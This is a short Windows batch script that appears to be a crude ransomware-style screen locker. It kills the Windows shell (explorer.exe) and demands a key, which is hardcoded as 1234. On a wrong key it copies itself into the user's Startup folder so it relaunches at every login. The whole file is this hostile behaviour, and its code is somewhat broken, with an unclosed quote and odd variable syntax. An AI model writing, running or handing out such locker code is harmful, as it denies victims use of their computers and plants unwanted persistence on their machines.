@echo off
taskkill /f /im explorer.exe
echo enter key here:
set /p key:=
if %key:%==1234 goto pass
echo wrong
XCOPY "ransome.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
pause
exit
:pass
echo right!
echo good job
start explorer.exe
pause
exit